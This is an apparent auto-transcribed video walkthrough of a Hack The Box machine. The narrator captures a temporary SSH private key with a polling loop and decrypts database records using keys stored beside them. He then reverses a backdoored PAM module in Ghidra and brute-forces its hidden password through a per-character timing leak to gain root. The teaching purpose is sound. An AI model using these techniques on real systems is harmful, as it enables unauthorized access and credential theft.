get in so this is the sql server if we do ls on slash we have that entry point again so this is just a standard docker container it looks like this is standard my sequel i was kind of glancing over that just because we did see like the back door being copied in the wordpress one first but i don't see anything here her docker user is a low priv user and there is no user.txt but there is a bash history we can take a look at that and it's just ls exit so nothing interesting there um i'm going to run piece by to see if this document container actually does anything so let's do github piece by and find this and then download it let's get the 64 small and then let's see do we have a dub dub dub directory still or are we listening on 80s what i should say um we are so have to just find that web service here it is so let's copy piece by here and then start a web server wget 10 10 14 8. piece by 64 s curl dash o piece by 64 s neither those are found we can just scp it i guess so let's make sure this password's on a clipboard and we can say scp dub dub dub pspy to this directory and we can ssh awesome chmod plus x on it and then we execute it and can see what happens on this container so i'm going to let this run for a few minutes and we'll see if anything interesting comes out after about a minute we can see this weird ssh command so it runs a dump and then writes the dump to this temp directory of backup.txt and then we see an sshing something off so ford agent no permit local commands no clear affording yes remote command request tty the interesting thing is this temp directory so we got temp slash temp dot some random thing slash key and i means private key so we have jack's private key to 172 6901 which is going to be the gateway of this so most likely the host so what we want to do is grab this file and we can see it is changing so um we probably have to write some type of loot and the easiest way to go about this is just a quick bash script so if i do echo please subscribe and then we echo the mat um like special variable dollar question mark this is going to be the exit code so if i run a command like this and then do the exit code it's going to be 127. so if i try to cat a file that doesn't exist it's going to be 1. so if by cataphile that does exist we can do like etsy passwd right um then it's going to be zero so we can set this to anything by just cutting something stupid so now the exit command is set to one and now i can say while the exit command is not equal to zero then we can cat temp star key and then done and we'll probably want to put the error messages to devnl because every time this runs it's going to [Music] spit out the message i can't read this file right so if we let this run for a minute i think we're going to get a key as long as we did everything correctly because right now what's happening we have this while loop we're cutting this file and after we cap this the exit code is going to be one because this file does not exist and that runs it again it gets one and until it actually catch the file because the temp directory exists from whatever script is logging in here it sets it to uh zero which means a while loops quits and there we have it we have a private key so it's a really good way to extract temporary files from a system but we can copy this key and then v jack dot pub or this is actually jack dot key not pub it's not his public key it's his private key we got it chmod 600 jack dot key sh-i jack at 10 10 11 121 and we are now inside of the host so we can also get the user.txt now but after all that effort now we can begin the priv esque to root there was a hint that we missed a long time ago because we didn't keep digging into something and it's only a hint because you don't actually need to do this to solve the box but for completionist's sake i wanted to show it so if you remembered back when we got into gogs and had this whole support system thing um we could have actually decrypted this database um i made a small mistake when doing it but it's kind of why um i don't like running a bunch of like automated tools even though i didn't run an automated tool here i think it kind of will um show what i'm talking about so we did a sequel light 3 on this database dumped it and just saw a bunch of data i was like let's move on but um don't we kind of just got overloaded with data right if i just did like a dot schema to understand the tables i would see there's two tables a support encryption and encryption meta and encryption meta just has key iv mode so we got all the encryption keys to decrypt it in the sqlite database so i don't know exactly why it's encrypted to begin with because it's just that easy and it may seem unrealistic but you'd be surprised how often this is the case where like um database uh data in a database is encrypted but the key is also in the database it's weird but it does common all right does happen i forgot the from so select star from encryption meta and we get the key the iv and the mode it's aes cbc so we can also do the same thing select star from support encryption and get the encrypted data actually um let's do that schema again i'm going to select star from encryption meta and then all i want is the encryption blob from support encryption because i don't want all that information about like support like the time they submitted things like that so select encryption blob from encryption meta um from support like this there we go so now let's go to cyber chef to decrypt it i'm pretty sure that we could have um decrypted in sql lite but i don't know how to do that and cyber staff is just so fast so i'm going to copy and paste this we can take this from hex out and just say aes decrypt it's in cbc mode so let's take [Music] key the iv and we see the support system sucks we need to change it so let's go to the next one so copy this one and take the next key in iv grab this and this is saying hey my authentication has been really slow since we were attacked i ran some scanners as my user but didn't find anything out of the ordinary can an engineer come and take a look so that one sounds interesting logins are going slow and we can test that let's just see what this one is it's probably going to be a message from the attacker but i don't know what it is so let's see this and this uh what i copied this yep bb8 okay and this i don't know what i'm doing wrong here um maybe that's the actual output of it being let's change this to four yeah so that's the actual output um let's look at xxd real quick i have no idea what this is uh two hex is what i want yeah no idea um [Music] what that is file i know there's a way to identify the file type but detect file type see if this is nope no idea but logins are going slow and let's see what they mean about that so i'm gonna do su dash we'll type please subscribe and we're waiting we're waiting it seems like it may have taken a longer time but let's test it on our machine right we'll do asd asd here and see if they finish at the same time they kind of did um abc let's see i wonder oh wait we're on my sequel here we're on the docker container um let's do su-abc su dash abc paste these and see well that one came really fast um hipsec s-u so i don't see logins going slow let's see um let's do a super long password so echo md5 sum let's try a password like this su dash su so that's not taking a while i guess we can further analyze this with the time command so if i just echo a password into su this should i'll put how long it takes there we go about three seconds so if i do this on toby we can see how long this takes so it's taking one second and it's taking me about three seconds but this could just be a difference between hack the box and my vm but i find it weird that the heck the box vm has more compute power than my personal one so maybe something weird is going on um i'm gonna try it on the kraken as well um i have to enter time though um we can see this is like instant so that is super fast um but not a lot to go on here so the next thing we're going to do is just look for any type of backdoor so i'm going to do a fine slash dash type f print f and this is my favorite way to find backdoors um i find them on my computer from time to time because when i'm just like testing out root kits and forget i left it on a vm this always finds them so before we put it into there let's just do this so we can see what it does um let's see fine print f percent t plus so the whole idea here is time stamps go down to a very granular time and generally when package managers like after you unzip something it chops off this whole time stamp and only leaves up to the second but the timestamp itself is 32-bit so if you interact with it on the file system uh you get much more so there's a lot of directories that general users just don't access like slash user slash var things like that so you can really see um what's placed there by a user and what's placed there by a um file system so we could take um let's do etsy we can try etsy first for looking at configs and the one thing we note is there's a lot of zeros so let's get rid of those i'm just going to grab v all this and that dash f is important because directories are like an outlier their timestamps are always going to be weird even from folders so i can remove the dash f after we find what we're looking for i'm going to add a to dev null here so we don't see any error messages whoops there we go and we can look at general files so sort so november 1st 2021 is the last time something was really done in etsy but we can kind of go up the list and see if anything stands out we have some pam stuff uh fs tab we have this dot bd which is weird so um we should look at that first name so let's look at what dot bd is so we have this etsy dot bd so if i lsla etsy dot bd star unfortunately we can't um we know it's 10 characters it's got a size of 10 but we only root can read it let's look at var see if there's anything in this directory or we can do user user's another good one so python is an outlier because whenever you run a python script it creates this pyc file so whenever i do forensics like this i always grab out python so we can add python to this exclusion list and let's see what else we have so we have a bunch of stuff in user lib modules so i'm guessing this one like an app update was ran and they updated the system info der plymouth that's normal what is sticking out here anything we have this mypam.so in the security this is really weird that is not a default pam module if we look at everything in this directory so if i do this find command on this specific directory uh there's only one pam thing so uh someone created that i was hoping to find other pam modules um let's see but fine slash user grep pam oh wait i'm an idiot so we'll look at this security we only see mypm.so i'm going to get rid of this whole grep v thing and we see all the pam modules but all them are placed there by apt so they all have all these years in the time stamp so this mypam.so really sticks out uh we can also look at the file system now for this date so if i grab let's see let's only do 714 right i'm going to add the um what do i call its back uh the greps and i'm going to grab this and we'll just do find slash and i'm going to add a grep for that timestamp so this is going to show us everything that happened on well not everything that happened but files with a timestamp of july 14th which happens to be my birthday but i did not create this box i wonder if that's a fun easter egg or just a huge coincidence so etsy pamsu was changed so if we can look at this is this something we have permission to it is so i'm guessing um that was changed to allow where is that file name my pam grep my pam on this does it exist it doesn't does exist in login it does not so i guess it just includes maybe this directory i don't know exactly how they installed this but we saw these files were modified i don't know what this f2 pi is um [Music] what is it oh it's numpy it's probably like a um big weird mathematical number thing so let's look at this again so they install this this known host is being edited so i'm guessing um [Music] the ssh somewhere here so this is the attacker we definitely have them on the system and then 40 minutes later they ssh'd somewhere if we look at the known host file it's this new format i don't actually know how to reverse this to actually get the ip addresses i'm sure there's probably a way um we have etsy dot bd so these files are created after this my pm.so so this mypam.so is interesting and it looks like we do have read access over it if i do a strings against it and grep4.bd it does have that code in it so we know it looks at this file let's copy it back to our box and open up engine reverse it so scp-i what was my key scp-i jack.key jack at 10 10 11 121 paste this put it here and then we will open ghidra up and analyze my pam.so so close that new project give it a name open the little dragon and then when it opens hit i and open the um module and then do all the default analysis options and when it's done you could try to like guess where the actual back door is like if you scroll down maybe this verify password hash looks juicy i mean it's putting a whole character string here but um that's generally not how i do things we know there is one interesting string in this program i'm going to change the script to search all and that interesting string was etsy.bd that one file that we saw on the box so we go there and then we have the disassembly view and it shows there's a cross reference to this pam sm authenticate so let's go there and then if we like highlight this block of code we can see where it is in the decompiler so right here we have it doing a open on etsy bd as read and then here it looks like it is um checking if the file handle is nothing and if it is i'm guessing this goes to like end or something so um if etsy bd does not exist is my assumption uh where did that put the comment that i have no idea where that when let's try it again um etsy bd okay okay let's try that again does not exist there we go so here we load in what looks to be the password so this is the contents of etsy bd and we're loading up to a null byte and i don't know what this p is so if we middle click on p we can see everywhere it's used and up here it's care p so it's gonna guess it's like the actual password or what the user entered uh we could look at like this pam get auth token syscall so if i look at pam auth token uh we have to go to google go to the man page we can see it is the third parameter we pass so concert care auth toke um i'm guessing this is the password uh i actually don't know um not exactly sure what the p is but based upon this i'm assuming it's going to be the password we type because we know this pw this one came from the uh reading the file right so this is the hard coded password i'm guessing this is what we input and then this l ver 10. uh we can see exactly what this is it starts off at zero and if we go we can see it's adding one right here and then this whole do loop is incrementing this l vertex right so this is definitely the incrementer so we can just rename this one to i because that's the iter whoa i said increment iterator is the right word um so here we have it and we're saying if character 0 and what we put in the password is not equal to the password plus 0 as well then it's going to call the unix verify password function else it's going to do a bunch of things and then add one so what this looks like is if we can guess the password it's never going to or not guess the password if we have the back door password it never calls this unix verify password because it goes through each character comparing it and because it's adding this you sleep uh looks like a hundred thousand microseconds so a tenth of a second i would think because it adds a tenth of a second for every valid character you have we have some weird timing attack where we can just grab the password because let's see we read the file put it in password we compare the first character the first character let's say it matches the password so we're going to skip over this unix verify go down and now we're going to sleep a 10th of a second and we go to the next character and then we're going to compare it again because this is the memory address of the password plus the incrementer so password begins at let's say 0x10 even though it's a horrible memory address i it starts reading the password and then we go zero x ten plus one so zero x eleven and it gets that character so it's just incrementing um the character of each thing and this side is the hard-coded password this is what the user inputs so i guess we can kind of test this out by just doing a bunch of one character passwords and loop through it until we actually hit a time and we kind of started with that because we have that echo command we had done before right this i think i did it yep right here so we can see this command took um one second and if it took 1.1 seconds chances are that is going to be the very first character if it takes 1.2 seconds that's gonna be the first two characters are correct if it takes 1.5 seconds then the first five characters are correct and we know it goes up to um 10 because we have it right here and then the length of the file was also 10. so let's test this out uh first we have to create a file that has pretty much every character that can be in a password so we're going to use python so python3 dash c import string and then we can print let's see string dot i think ascii uppercase is this how we do it um let's see if it actually prints that maybe it's not all capitals ascii uppercase like that there we go and then string dot ascii lowercase okay and then we can do string dot digits to do numbers and then string dot punctuation if i can spell that correctly and i cannot um let me just go to google real quick punctuation of course i probably spell it correctly as i'm typing into google but let's just put this here and that looks good so i'm going to send this to a file called word list i'm going to go into dev shm first so we can send this to wl.txt and then i can say 4in cat wl.text do echo i done and i put everything on one line so that's not what we want so let's take this print command and before it we can do quote dot n or slash n and join so now uh only join an enterable item that is not what i expected let's see i wonder if we get rid of the print cat wl see if we put print before this there we go that's how we do it and now if i cat wa text we have something on every line so we can run our bash script again so for i and that's weird wl and multipath so what happened here is it didn't echo star and put everything so i'm just going to remove the star from this word list instead of trying to deal with that special character do the lazy thing and really hope that the password doesn't have a star in it so we can do this for loop and let's do um a script now so it's easier to read i'm not just doing it all on one line so we can do crack.sh this isn't actually crack it's more like a brute force brute force by character cracks a bad name so we can echo so what we probably want to do is the time and then echo pipe it to su root like that and before we run time we want to echo i so if i run crack we should see this and um i'm going gonna make it like shrink the output so we only have the seconds so if we set um time format is equal to i think percent e like that i think this will change how time is formatted it does and how i knew that is if you just go to um the man page there's a dash f format otherwise it takes it from environment variables i had tried so when i was doing this machine i had tried to use like the time dash f percent e like this but it did not work so that's why i went to the other way um yeah dash f not found so i'm not sure exactly what that all is about but i remember whenever i run time command i just put time format in a environment variable like this and then e is for elapsed time so if i run this we have that and now i want to get rid of password so i'm going to put a slash dev null did not work let's send i think it's standard error to it nothing there we go and the final thing we want to do is say echo dash n and then put a space so now we're putting the time everywhere so it's just going to run and every time we see 1.0 we know that's not going to be the password um hopefully by the time this runs we see a 1.1 and that would indicate this character is the actual password so i'm gonna let this run we'll continue the video once it finishes and i did not see any 1.1s it was all 1.0 so maybe the password actually has to be 10 characters long so let's take off this uh before we edit the script i can show what i'm doing so if we do print f and then we say percent minus 10 s like this and then we xxd it it's going to print 10 bytes so if we add abc it's going to do a b c and then fill it out to 10. so this is just padding it um this is probably nine bytes actually one two three four five six seven eight nine no ten ten bytes so um that's going to be what we try this time so let me go into my crack script and we're going to replace this echo with just the print f and then we can do the 10s like that and then dollar i so this should now brute force the first character well it's guessing the password but every time padding the guess to 10 characters so we see a bunch of 1.00 let's see if we see a 1.1 coming up soon hopefully we do and then if we do we can just run the script again with the second character so there we have it we have t at 1.1 so what i'm going to do is slightly edit this i'm going to put pass is equal to an empty variable and we can say p is equal to um let's do pass i like this and then we can just put p okay and we know the first character was capital t so now when we do this it's gonna do everything and now we're looking for a 1.2 so we keep saying 1.1 and i'm just going to fast forward the video till we hit a 1.2 and we're just going to keep going down the chain and there we have it ti ti is 1.2 so i'm going to put that there and we will yet again run this and now we're looking for a 1.3 so again gonna fast forward the video and there we have it uh h so let's add h here and you guessed it we're just going to keep going until we hit um all 10 so this isn't the most optimal way to do it i know plenty of people probably have scripted this but for something so simple like i could probably watch the 10 character password quicker than i could script it so why scripted at this point because it's a very narrow use case so oh tip so we have the next one and let's run it again and i'm gonna fast forward the video till wait maybe not we have a capital a i'm gonna run that again just to make sure 1.5 yep there we have it so let's add a capital a and we're already halfway done so now we're looking for a 1.6 there we have it at q so let's add q here and run it again and let's see what we get so now we're looking for 1.7 seconds and there we have it i was getting worried there because this one took a while went all the way to four but we finally have the next increment so let's hope this next one doesn't take nearly as long we're looking for 1.8 seconds so let's fast forward yet again there we have it it is a p so let's add that run this again and we're looking for 1.9 we have 1 2 3 4 5 6 eight characters so we have just two more left so waiting for the 1.9 fast forwarding there we have it there's an s and then i want to say we are on the last uh number or not number but last character it could be anything we're looking for a 2 i believe so this is 1 2 3 4 5 6 7 eight nine yep this would be the tenth so looking for something that takes two point something seconds now that is odd at the e it went down to one point zero seconds so i wonder if that is the actual password um we will try the four pse option i don't think i have any shells so i'm going to let this finish until we try it again but that's looking to be the password i don't know exactly why it did not take the full two seconds but um beggars can't be choosers i guess we're almost done going through everything it's got the numbers and symbols so i'm going to let it finish and then we're going to try a few things for this root password and that's it we never had a two second but we had the one second with this password so there's three possible things i think the password can be at this point it's either going to be this because this one took 1.0 seconds i'm not sure why it could be without this maybe the password was nine characters and then a line break and then the other one it could be a star because remember we removed that character because it was just behaving funny so the first password i'm going to try is the one on my clipboard it is that so let's just type that in and that is the password so it was the one that took 1.0 seconds and we can get root.tech so hope you guys enjoyed that video take care and i will see you all next time